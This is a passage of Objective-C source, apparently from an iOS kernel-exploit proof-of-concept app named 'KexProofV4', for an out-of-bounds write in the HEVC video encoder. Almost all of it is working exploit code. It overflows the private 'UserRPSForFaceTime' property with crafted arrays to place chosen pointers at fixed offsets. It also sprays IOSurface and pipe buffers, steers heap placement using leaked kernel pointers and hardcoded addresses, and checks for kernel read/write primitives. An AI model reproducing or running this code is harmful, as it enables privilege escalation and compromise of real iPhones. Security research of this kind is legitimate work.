                (int16_t)(pTag201 & 0xffffULL),
                (int16_t)((pTag201 >> 16) & 0xffffULL),
                (int16_t)((pTag201 >> 32) & 0xffffULL),
                (int16_t)((pTag201 >> 48) & 0xffffULL)
            };
            KPH9OutAppend(log, @"  rpsSlot0Math[0x%x->0x%x delta=0x%x(%uB) stride=0x%x]: d0=S0[%d..%d]/S1[%d..%d] d3=S0[%d..%d] d7=S0[%d..%d] d9=S0[%d..%d] | P_align=0x%016llx(x0=0x%016llx) P_tag=0x%016llx(x0=0x%016llx)\n",
                          kRpsBase, kSlot0Off, kDelta, kDelta, kStride,
                          iS0_d0, iS0_d0 + 3, jS1_d0, jS1_d0 + 1,
                          iS0_d3, iS0_d3 + 3, iS0_d7, iS0_d7 + 3, iS0_d9, iS0_d9 + 3,
                          pAlign, pAlign + 0x58ULL, pTag201, pTag201 + 0x58ULL);

            int innerLens[] = { 16, 24, 32, 48, 64, 376, 1088, 1620 };
            NSMutableArray *innerParts = [NSMutableArray array];
            for (size_t ili = 0; ili < sizeof(innerLens) / sizeof(innerLens[0]); ili++) {
                int ilen = innerLens[ili];
                NSMutableArray *s0Arr = [NSMutableArray arrayWithCapacity:(NSUInteger)ilen];
                int s1Len = (ilen >= 1620) ? 800 : 32;
                NSMutableArray *s1Arr = [NSMutableArray arrayWithCapacity:(NSUInteger)s1Len];
                for (int k = 0; k < ilen; k++) {
                    int16_t hval = (k >= iS0_d0 && k < iS0_d0 + 4) ? hwTag201[k - iS0_d0] : hwAlign[k & 3];
                    [s0Arr addObject:@(hval)];
                }
                for (int k = 0; k < s1Len; k++) {
                    [s1Arr addObject:@(hwAlign[k & 3])];
                }
                NSDictionary *rpsIn = @{
                    @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
                    @"NumNegativePics": @2,
                    @"NumPositivePics": @2,
                    @"DeltaPOCS0Minus1": s0Arr,
                    @"UsedByCurrPicS0Flag": @3,
                    @"DeltaPOCS1Minus1": s1Arr,
                    @"UsedByCurrPicS1Flag": @3,
                };
                OSStatus stIn = VTSessionSetProperty(brS, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[ rpsIn ]);
                [innerParts addObject:[NSString stringWithFormat:@"len%d=%d", ilen, (int)stIn]];
            }

            int outerLens[] = { 4, 5, 6, 7, 8, 10 };
            NSMutableArray *outerParts = [NSMutableArray array];
            for (size_t oli = 0; oli < sizeof(outerLens) / sizeof(outerLens[0]); oli++) {
                int olen = outerLens[oli];
                NSMutableArray *oArr = [NSMutableArray arrayWithCapacity:(NSUInteger)olen];
                for (int d = 0; d < olen; d++) {
                    int dLen = 16;
                    int hitBase = -1;
                    if (olen == 4 && d == 3) { dLen = 1088; hitBase = iS0_d3; }
                    else if (olen == 8 && d == 7) { dLen = 376; hitBase = iS0_d7; }
                    else if (olen == 10 && d == 9) { dLen = 16; hitBase = iS0_d9; }
                    NSMutableArray *dS0 = [NSMutableArray arrayWithCapacity:(NSUInteger)dLen];
                    for (int e = 0; e < dLen; e++) {
                        int16_t hv = (hitBase >= 0 && e >= hitBase && e < hitBase + 4)
                            ? hwAlign[e - hitBase]
                            : hwAlign[e & 3];
                        [dS0 addObject:@(hv)];
                    }
                    [oArr addObject:@{
                        @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
                        @"NumNegativePics": @2,
                        @"NumPositivePics": @2,
                        @"DeltaPOCS0Minus1": dS0,
                        @"UsedByCurrPicS0Flag": @3,
                        @"DeltaPOCS1Minus1": @[ @(hwAlign[0]), @(hwAlign[1]) ],
                        @"UsedByCurrPicS1Flag": @3,
                    }];
                }
                OSStatus stOut = VTSessionSetProperty(brS, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)oArr);
                [outerParts addObject:[NSString stringWithFormat:@"arr%d=%d", olen, (int)stOut]];
            }
            KPH9OutAppend(log, @"  rpsOobShaper: inner=[%@] outer=[%@]\n",
                          [innerParts componentsJoinedByString:@" "],
                          [outerParts componentsJoinedByString:@" "]);

            KPH9SafeTeardown(brS);
        }
    }

    // -------------------------------------------------------------------------
    // 8C: Dynamic NTL Heap-Band Steering (from Stage 5 Live Kernel Pointers) +
    //     Targeted pipebuf / IOSurface Spray & Slot[0] (+0x147b0) Low-Bit P Control
    // -------------------------------------------------------------------------
    KPH9OutAppend(log, @"  [8C: Dynamic NTL Heap-Band Steering + Targeted pipebuf/IOSurface Spray & Slot[0] (+0x147b0) P Control]\n");
    {
        // Place the 4 verified iPhone16,1 iOS 27.0.1 target bands FIRST so they are never crowded out,
        // then append up to 4 unique live ZONE_HEAP candidates discovered in Stage 5.
        int targetNTLs[8];
        uint64_t targetKPtrs[8];
        int nTargets = 0;
        for (int ci = 0; ci < gStage5CandCount && nTargets < 8; ci++) {
            if (KPClassifyKPtr(gStage5Cands[ci].kptr) != KPTR_CANDIDATE_ZONE_HEAP) continue;
            int sntl = gStage5Cands[ci].steeredNTL;
            if (sntl > 0 && sntl < 16463) {
                BOOL dup = NO;
                for (int j = 0; j < nTargets; j++) {
                    if (targetNTLs[j] == sntl) { dup = YES; break; }
                }
                if (!dup) {
                    targetNTLs[nTargets] = sntl;
                    targetKPtrs[nTargets] = gStage5Cands[ci].kptr;
                    nTargets++;
                }
            }
        }
        const int fallbackNTLs[4] = { 16444, 16446, 16433, 16462 };
        const uint64_t fallbackKPtrs[4] = { 0xffffffedfd620000ULL, 0xffffffefff31b3f0ULL, 0xffffffe289ee5658ULL, 0xffffffff00000059ULL };
        for (int fi = 0; fi < 4 && nTargets < 8; fi++) {
            BOOL dup = NO;
            for (int j = 0; j < nTargets; j++) {
                if (targetNTLs[j] == fallbackNTLs[fi]) { dup = YES; break; }
            }
            if (!dup) {
                targetNTLs[nTargets] = fallbackNTLs[fi];
                targetKPtrs[nTargets] = fallbackKPtrs[fi];
                nTargets++;
            }
        }

        // 1) Allocate 16 shared IOSurface buffers (256KB each) tiled with marker 0x5900cafe00000000 | idx
        //    and kfree-safe zeroed slots at page+0x48..0x57, page+0xf0..0xff, page+0x248..0x257
        NSMutableArray *sharedPools = [NSMutableArray array];
        NSArray<NSNumber *> *sharedIDs = KPH9AllocSurfacePool(16, 512, 256, sharedPools);
        for (NSUInteger si = 0; si < sharedPools.count; si++) {
            CVPixelBufferRef spb = (__bridge CVPixelBufferRef)sharedPools[si];
            IOSurfaceRef surf = CVPixelBufferGetIOSurface(spb);
            if (surf) {
                IOSurfaceLock(surf, 0, NULL);
                uint8_t *baseBytes = (uint8_t *)IOSurfaceGetBaseAddress(surf);
                uint64_t *base = (uint64_t *)baseBytes;
                size_t allocSz = IOSurfaceGetAllocSize(surf);
                uint64_t tag = 0x5900cafe00000000ULL | (uint64_t)si;
                if (base && allocSz >= 4096) {
                    for (size_t qi = 0; qi < allocSz / 8; qi++) base[qi] = tag;
                    for (size_t pg = 0; pg + 0x260 <= allocSz; pg += 4096) {
                        memset(baseBytes + pg + 0x48, 0, 16);
                        memset(baseBytes + pg + 0xf0, 0, 16);
                        memset(baseBytes + pg + 0x248, 0, 16);
                    }
                }
                IOSurfaceUnlock(surf, 0, NULL);
            }
        }

        // 2) Allocate targeted pipebuf spray (32 x 256KB ring buffers) with kfree-safe zeroed page offsets
        int h9Pipes[32][2];
        int h9PipesArmed = 0;
        uint8_t *pipeTile = (uint8_t *)malloc(256 * 1024);
        for (int p = 0; p < 32; p++) {
            h9Pipes[p][0] = h9Pipes[p][1] = -1;
            if (pipe(h9Pipes[p]) != 0) continue;
            fcntl(h9Pipes[p][1], F_SETPIPE_SZ, 256 * 1024);
            fcntl(h9Pipes[p][1], F_SETFL, O_NONBLOCK);
            if (pipeTile) {
                uint64_t pTag = 0x5900beef00000000ULL | (uint64_t)p;
                uint64_t *ptq = (uint64_t *)pipeTile;
                for (size_t qi = 0; qi < (256 * 1024) / 8; qi++) ptq[qi] = pTag;
                for (size_t pg = 0; pg < 256 * 1024; pg += 4096) {
                    memset(pipeTile + pg + 0x48, 0, 16);
                    memset(pipeTile + pg + 0xf0, 0, 16);
                    memset(pipeTile + pg + 0x248, 0, 16);
                }
                if (write(h9Pipes[p][1], pipeTile, 256 * 1024) > 0) {
                    h9PipesArmed++;
                }
            }
        }

        // Test mach_make_memory_entry_64 + vm_remap read/write alias on the first Stage 5 candidate page (if any)
        if (gStage5CandCount > 0) {
            vm_address_t candPage = gStage5Cands[0].userVA & ~(vm_address_t)0x3fffULL;
            memory_object_size_t entrySz = 0x4000;
            mach_port_t memEntry = MACH_PORT_NULL;
            kern_return_t meKr = mach_make_memory_entry_64(mach_task_self(), &entrySz, candPage,
                                                           VM_PROT_READ | VM_PROT_WRITE, &memEntry, MACH_PORT_NULL);
            vm_address_t remapAddr = 0;
            vm_prot_t curP = 0, maxP = 0;
            kern_return_t rmKr = KERN_FAILURE;
            uint64_t aliasVal = 0;
            if (meKr == KERN_SUCCESS && memEntry != MACH_PORT_NULL) {
                rmKr = vm_remap(mach_task_self(), &remapAddr, 0x4000, 0, VM_FLAGS_ANYWHERE,
                                mach_task_self(), candPage, FALSE, &curP, &maxP, VM_INHERIT_SHARE);
                if (rmKr == KERN_SUCCESS && remapAddr) {
                    vm_size_t pageOff = gStage5Cands[0].userVA - candPage;
                    if (pageOff + 8 <= 0x4000) {
                        aliasVal = *(volatile uint64_t *)(remapAddr + pageOff);
                    }
                    vm_deallocate(mach_task_self(), remapAddr, 0x4000);
                }
                mach_port_deallocate(mach_task_self(), memEntry);
            }
            KPH9OutAppend(log, @"  cand0MemoryEntry[va=0x%lx,page=0x%lx]: makeEntry=0x%x remap=0x%x(prot=%x/%x) aliasRead=0x%016llx\n",
                          (unsigned long)gStage5Cands[0].userVA, (unsigned long)candPage,
                          meKr, rmKr, curP, maxP, aliasVal);
        }

        // Run dynamic NTL heap-band steering + UserRPSForFaceTime slot[0] (+0x147b0) P-control sessions:
        CVPixelBufferRef steerPx = KPH9CreatePixelBuffer(1280, 720);
        for (int ti = 0; ti < nTargets; ti++) {
            int sntl = targetNTLs[ti];
            uint64_t origKPtr = targetKPtrs[ti];
            uint64_t steeredX0 = ((uint64_t)(uint32_t)(sntl - 16463) << 32) | 0x59ULL;
            // Full 64-bit P with controlled lower bits (0x00a8 -> x0 = pageBase + 0x0100)
            uint64_t pTarget64 = (origKPtr & 0xffffffffffffc000ULL) | 0x00a8ULL;
            uint64_t x0Aligned = pTarget64 + 0x58ULL;
            uint32_t lo32 = (uint32_t)(pTarget64 & 0xffffffffULL);
            uint32_t hi32 = (uint32_t)(pTarget64 >> 32);
            int16_t pHw[4] = {
                (int16_t)(pTarget64 & 0xffffULL),
                (int16_t)((pTarget64 >> 16) & 0xffffULL),
                (int16_t)((pTarget64 >> 32) & 0xffffULL),
                (int16_t)((pTarget64 >> 48) & 0xffffULL)
            };

            // Build arr8 where dict#7 (pINS+0x14498) has 376 S0 elements so S0[368..371] lands on slot[0] (+0x147b0..0x147b7)
            NSMutableArray *s0Short = [NSMutableArray arrayWithCapacity:32];
            for (int k = 0; k < 32; k++) [s0Short addObject:@(pHw[k & 3])];
            NSMutableArray *s0Hit376 = [NSMutableArray arrayWithCapacity:376];
            for (int k = 0; k < 376; k++) [s0Hit376 addObject:@(pHw[k & 3])];
            NSDictionary *dShort = @{
                @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
                @"NumNegativePics": @2, @"NumPositivePics": @2,
                @"DeltaPOCS0Minus1": s0Short, @"UsedByCurrPicS0Flag": @3,
                @"DeltaPOCS1Minus1": @[ @(pHw[0]), @(pHw[1]) ], @"UsedByCurrPicS1Flag": @3,
            };
            NSDictionary *dHit = @{
                @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
                @"NumNegativePics": @2, @"NumPositivePics": @2,
                @"DeltaPOCS0Minus1": s0Hit376, @"UsedByCurrPicS0Flag": @3,
                @"DeltaPOCS1Minus1": @[ @(pHw[0]), @(pHw[1]) ], @"UsedByCurrPicS1Flag": @3,
            };
            NSArray *rpsSlot0Arr8 = @[ dShort, dShort, dShort, dShort, dShort, dShort, dShort, dHit ];

            int u1Post = -1;
            OSStatus u1Prep = -999;
            VTCompressionSessionRef uSib = NULL;
            if (sntl < 16463) {
                if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                               NULL, NULL, NULL, NULL, NULL, &uSib) == noErr && uSib) {
                    VTSessionSetProperty(uSib, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                    VTSessionSetProperty(uSib, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                    VTSessionSetProperty(uSib, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                    VTSessionSetProperty(uSib, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
                    VTSessionSetProperty(uSib, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(sntl));
                    u1Prep = VTCompressionSessionPrepareToEncodeFrames(uSib);
                    CFNumberRef urb = NULL;
                    if (VTSessionCopyProperty(uSib, CFSTR("NumberOfTemporalLayers"), NULL, &urb) == noErr && urb) {
                        CFNumberGetValue(urb, kCFNumberIntType, &u1Post);
                        CFRelease(urb);
                    }
                }
            }

            Stage6ProbeResult *sRes = Stage6AllocResult();
            VTCompressionSessionRef s = NULL;
            NSDictionary *sSpec = @{ @"EnableUserRefForFacetime": @YES };
            if (sRes && VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                                   (__bridge CFDictionaryRef)sSpec, NULL, NULL, Stage6OutputCallback, sRes, &s) == noErr && s) {
                int effNtl = (sntl >= 1 && sntl <= 7) ? sntl : 7;
                VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
                VTSessionSetProperty(s, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
                VTSessionSetProperty(s, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@15);
                OSStatus uSt = VTSessionSetProperty(s, CFSTR("BaseLayerFrameRate"), (__bridge CFNumberRef)@30);
                OSStatus pubSt = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(effNtl));

                // Shape DPB (34 ints) + UserRPSForFaceTime slot[0] on paired sibling session
                OSStatus dpbSt = -1, rpsSt = -1;
                VTCompressionSessionRef dpbSib = NULL;
                if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                               (__bridge CFDictionaryRef)sSpec, NULL, NULL, NULL, NULL, &dpbSib) == noErr && dpbSib) {
                    VTSessionSetProperty(dpbSib, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                    VTSessionSetProperty(dpbSib, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
                    VTSessionSetProperty(dpbSib, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
                    KPH9PrimeRealTime(dpbSib);
                    VTCompressionSessionPrepareToEncodeFrames(dpbSib);
                    NSMutableArray *dpbShape = [NSMutableArray arrayWithCapacity:34];
                    for (int p = 0; p < 17; p++) {
                        [dpbShape addObject:@((int32_t)lo32)];
                        [dpbShape addObject:@((int32_t)hi32)];
                    }
                    dpbSt = VTSessionSetProperty(dpbSib, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpbShape);
                    rpsSt = VTSessionSetProperty(dpbSib, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rpsSlot0Arr8);
                }

                int prePub = -1, postPub = -1, postEnc = -1;
                CFNumberRef rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &prePub); CFRelease(rb);
                }
                OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(s);
                rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &postPub); CFRelease(rb);
                }
                OSStatus encSt = -1;
                if (steerPx && sntl < 16463) {
                    encSt = VTCompressionSessionEncodeFrame(s, steerPx, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                    int w0 = 0;
                    while (sRes->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                }
                // Write full 64-bit P into slot[0] (+0x147b0) via UserRPSForFaceTime arr8 S0[368..371] before post-IDR NTL latch & teardown
                OSStatus sRpsSt = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rpsSlot0Arr8);
                (void)rpsSt;
                VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                pubSt = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(sntl));
                rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &postEnc); CFRelease(rb);
                }
                OSStatus encSt1 = -1;
                if (steerPx && sntl < 16463) {
                    NSDictionary *pProps = @{ (id)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO };
                    encSt1 = VTCompressionSessionEncodeFrame(s, steerPx, CMTimeMake(1, 30), kCMTimeInvalid, (__bridge CFDictionaryRef)pProps, NULL, NULL);
                    int w1 = 0;
                    while (sRes->cbCount < 2 && w1 < 80) { usleep(2000); w1 += 2; }
                }
                OSStatus cbSt = sRes->lastStatus;
                NSString *cbFirst = nil;
                @synchronized ([KPH9EncoderModule class]) {
                    sRes->closed = 1;
                    cbFirst = [NSString stringWithUTF8String:sRes->first] ?: @"(no cb)";
                }
                KPH9SafeTeardownEx(s, NULL, sRes);
                if (uSib) KPH9SafeTeardown(uSib);
                if (dpbSib) KPH9SafeTeardown(dpbSib);

                int seqSubLayersM1 = (postPub < 2 && effNtl >= 2) ? (effNtl - 1) : (postPub - 1);
                KPH9OutAppend(log, @"  dynSteer[kptr=0x%016llx -> NTL=%d x0=0x%016llx P_slot0=0x%016llx(x0_al=0x%016llx)]: u1Prep=%d(u1POST=%d) frac15_30=%d pubSet=%d dpb34=%d rpsSlot0=%d PRE=%d prep=%d POST=%d([+0x2eec]=%d) POST_ENC=%d enc0=%d enc1=%d(cb=%d) | %@\n",
                              origKPtr, sntl, steeredX0, pTarget64, x0Aligned, (int)u1Prep, u1Post, (int)uSt, (int)pubSt, (int)dpbSt, (int)sRpsSt,
                              prePub, (int)prepSt, postPub, seqSubLayersM1, postEnc, (int)encSt, (int)encSt1, (int)cbSt, cbFirst);
            } else {
                if (sRes) free(sRes);
                if (uSib) KPH9SafeTeardown(uSib);
            }
        }
        if (steerPx) CVPixelBufferRelease(steerPx);

        // Scan shared IOSurface pool for any kernel-written qwords != tag (skipping our kfree-safe zeroed slots)
        int surfMutations = 0;
        for (NSUInteger si = 0; si < sharedPools.count; si++) {
            CVPixelBufferRef spb = (__bridge CVPixelBufferRef)sharedPools[si];
            IOSurfaceRef surf = CVPixelBufferGetIOSurface(spb);
            if (!surf) continue;
            IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
            uint8_t *baseBytes = (uint8_t *)IOSurfaceGetBaseAddress(surf);
            uint64_t *base = (uint64_t *)baseBytes;
            size_t allocSz = IOSurfaceGetAllocSize(surf);
            uint64_t expectedTag = 0x5900cafe00000000ULL | (uint64_t)si;
            if (base && allocSz >= 4096) {
                for (size_t qi = 0; qi < allocSz / 8 && surfMutations < 8; qi++) {
                    size_t byteOff = qi * 8;
                    size_t inPage = byteOff & 0xfffULL;
                    if (inPage == 0x48 || inPage == 0x50 || inPage == 0xf0 || inPage == 0xf8 || inPage == 0x248 || inPage == 0x250) continue;
                    if (base[qi] != expectedTag) {
                        size_t pageOff = byteOff & ~(size_t)0xfffULL;
                        uint64_t unal59 = 0, al100 = 0;
                        if (pageOff + 0x108 <= allocSz) {
                            memcpy(&unal59, baseBytes + pageOff + 0x59, sizeof(uint64_t));
                            memcpy(&al100,  baseBytes + pageOff + 0x100, sizeof(uint64_t));
                        }
                        KPH9OutAppend(log, @"    surfDelta[sid=%@ idx=%lu +0x%zx]: 0x%016llx (expected 0x%016llx, page59=0x%016llx, page100=0x%016llx)\n",
                                      sharedIDs[si], (unsigned long)si, byteOff, base[qi], expectedTag, unal59, al100);
                        surfMutations++;
                    }
                }
            }
            IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
        }

        // Scan targeted pipebuf ring buffers for [x0, x0, x0, 0] at page+0x58, +0x59, +0x100, +0x259 or qword mutations
        int pipeMutations = 0;
        for (int p = 0; p < 32; p++) {
            if (h9Pipes[p][0] < 0) continue;
            uint8_t *pbuf = (uint8_t *)malloc(256 * 1024);
            if (pbuf) {
                ssize_t got = read(h9Pipes[p][0], pbuf, 256 * 1024);
                uint64_t expectedPTag = 0x5900beef00000000ULL | (uint64_t)p;
                if (got >= 4096) {
                    const size_t probeOffs[4] = { 0x58, 0x59, 0x100, 0x259 };
                    for (size_t pg = 0; pg + 0x280 <= (size_t)got && pipeMutations < 8; pg += 4096) {
                        for (int oi = 0; oi < 4; oi++) {
                            size_t off = pg + probeOffs[oi];
                            uint64_t s1 = 0, s2 = 0, s3 = 0;
                            uint32_t z = 0;
                            memcpy(&s1, pbuf + off, 8);
                            memcpy(&s2, pbuf + off + 8, 8);
                            memcpy(&s3, pbuf + off + 16, 8);
                            memcpy(&z,  pbuf + off + 24, 4);
                            if (s1 != expectedPTag && s1 != 0 && s1 == s2 && s2 == s3 && z == 0) {
                                uint64_t rwTest = s1 ^ 0x00000000feedfaceULL;
                                memcpy(pbuf + off, &rwTest, 8);
                                ssize_t wr = write(h9Pipes[p][1], pbuf + pg, 4096);
                                uint64_t rwRb = 0;
                                if (wr >= 4096) {
                                    uint8_t rdb[4096];
                                    if (read(h9Pipes[p][0], rdb, 4096) >= (ssize_t)(probeOffs[oi] + 8)) {
                                        memcpy(&rwRb, rdb + probeOffs[oi], 8);
                                    }
                                }
                                KPH9OutAppend(log, @"    pipeKrwHit[pipe=%d page=0x%zx+0x%zx]: x0=0x%016llx rwVerify=0x%016llx\n",
                                              p, pg, probeOffs[oi], s1, rwRb);
                                pipeMutations++;
                            }
                        }
                    }
                }
                free(pbuf);
            }
            close(h9Pipes[p][0]);
            close(h9Pipes[p][1]);
        }
        if (pipeTile) free(pipeTile);

        // Re-read all Stage 5 candidate userland VAs to detect any live value change
        int vaDeltas = 0;
        for (int ci = 0; ci < gStage5CandCount; ci++) {
            uint64_t curVal = 0;
            vm_size_t outSz = 0;
            if (vm_read_overwrite(mach_task_self(), gStage5Cands[ci].userVA, sizeof(uint64_t),
                                  (vm_address_t)&curVal, &outSz) == KERN_SUCCESS && outSz == sizeof(uint64_t)) {
                if (curVal != gStage5Cands[ci].kptr) {
                    vaDeltas++;
                    KPH9OutAppend(log, @"    candVADelta[%d @ 0x%lx]: 0x%016llx -> 0x%016llx\n",
                                  ci, (unsigned long)gStage5Cands[ci].userVA, gStage5Cands[ci].kptr, curVal);
                }
            }
        }
        KPH9OutAppend(log, @"  postSteerScan: sharedSurfPool=%lu surfMutations=%d pipesArmed=%d pipeMutations=%d stage5CandChecked=%d vaDeltas=%d\n",
                      (unsigned long)sharedPools.count, surfMutations, h9PipesArmed, pipeMutations, gStage5CandCount, vaDeltas);
    }

    CVPixelBufferRelease(px);
}

// Executes a VideoToolbox stage on a detached queue with a hard wall-clock
// timeout and a live-shared output buffer so partial progress is NEVER lost
// even if a step inside the stage stalls.
static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimedOut, void (^block)(NSMutableString *out)) {
    NSMutableString *liveOut = [NSMutableString string];
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    dispatch_queue_t q = dispatch_queue_create("com.stealth.kexproofv4.h9.stage", DISPATCH_QUEUE_CONCURRENT);
    dispatch_async(q, ^{
        @try {
            if (block) block(liveOut);
        } @catch (NSException *ex) {
            KPH9OutAppend(liveOut, @"  [EXCEPTION in %@: %@]\n", label, ex.reason);
        }
        dispatch_semaphore_signal(sem);
    });
    dispatch_time_t deadline = dispatch_time(DISPATCH_TIME_NOW, timeoutMs * (int64_t)NSEC_PER_MSEC);
    if (dispatch_semaphore_wait(sem, deadline) != 0) {
        BOOL alive = KPH9IsVideoCodecdAlive();
        if (outTimedOut) *outTimedOut = !alive;
        NSString *partial = nil;
        @synchronized (liveOut) {
            partial = [liveOut copy];
        }
        return [NSString stringWithFormat:
                @"%@  [TIMEOUT %lld ms in %@ — videocodecd XPC %@]\n",
                partial ?: @"", timeoutMs, label,
                alive ? @"ALIVE (stage-local stall only; continuing)" : @"UNRESPONSIVE / THROTTLED"];
    }
    if (outTimedOut) *outTimedOut = NO;
    @synchronized (liveOut) {
        return [liveOut copy];
    }
}

@interface KPH9EncoderModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPH9EncoderModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"h9encoder.oob";
        _title = @"H9 encoder OOB write";
        _subtitle = @"AVE_HEVC_ST_RPS_Retrieve & DPB/NTL audit (bounded XPC)";
        _icon = @"video";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)resetJournal {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
    [[NSFileManager defaultManager] createFileAtPath:path contents:[NSData data] attributes:nil];
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[h9] %@", line];
}

- (NSString *)runReport {
    [self resetJournal];
    [self journal:@"=== H9 clean rebuild start ==="];

    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · H9 Encoder OOB Write (Clean Rebuild) ===\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d pid=%d\n",
     UIDevice.currentDevice.systemVersion, getuid(), getpid()];

    BOOL vtHung = NO;

    // -------------------------------------------------------------------------
    // Stage 1: AVE_HEVC_ST_RPS_Retrieve (UserRPSForFaceTime 2+2 vs 32+32 OOB)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 1: RPS OOB probe"];
    [report appendString:@"\n--- Stage 1: AVE_HEVC_ST_RPS_Retrieve (UserRPSForFaceTime) ---\n"];
    NSString *s1 = KPH9RunTimed(@"Stage1-RPS", 5000, &vtHung, ^(NSMutableString *out) {
        NSMutableArray *cbSink = [NSMutableArray array];
        CFTypeRef retainedSink = CFRetain((__bridge CFTypeRef)cbSink);
        NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
        VTCompressionSessionRef s = NULL;
        OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                 kCMVideoCodecType_HEVC,
                                                 (__bridge CFDictionaryRef)spec,
                                                 NULL, NULL, KPH9AttsCB,
                                                 (void *)retainedSink, &s);
        KPH9OutAppend(out, @"  session create -> %d\n", (int)st);
        if (st != noErr || !s) {
            CFRelease(retainedSink);
            return;
        }

        VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        VTSessionSetProperty(s, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
        KPH9PrimeRealTime(s);

        // Exact DSC .68 schema for AVE_HEVC_ST_RPS_Retrieve (0x9cdba0) & AVE_HEVC_ST_RPS_RetrieveArray (0x9ce010):
        //   1) Branch InterRefPicSetPredictionFlag == kCFBooleanFalse (0x9cdde0):
        //      - NumNegativePics    :CFNumber (AVE_CFDict_GetSInt32 -> [pInfo + 0x30])
        //      - NumPositivePics    :CFNumber (AVE_CFDict_GetSInt32 -> [pInfo + 0x34])
        //      - DeltaPOCS0Minus1   :CFArray<CFNumber> (capital POC! AVE_CFArray_GetSInt16 loop 0..CFArrayGetCount-1 -> int16_t [pInfo + 0x38 + 2*i])
        //      - UsedByCurrPicS0Flag:CFNumber SInt16 bitmask (ends with Flag! AVE_CFDict_GetSInt16 0x9bea24 -> SIMD 16B [pInfo + 0x58..0x67])
        //      - DeltaPOCS1Minus1   :CFArray<CFNumber> (capital POC! AVE_CFArray_GetSInt16 loop 0..CFArrayGetCount-1 -> int32_t [pInfo + 0x68 + 4*i])
        //      - UsedByCurrPicS1Flag:CFNumber SInt16 bitmask (ends with Flag! AVE_CFDict_GetSInt16 0x9bea24 -> SIMD 16B [pInfo + 0xa8..0xb7])
        //   2) Branch InterRefPicSetPredictionFlag == kCFBooleanTrue (0x9cdc24):
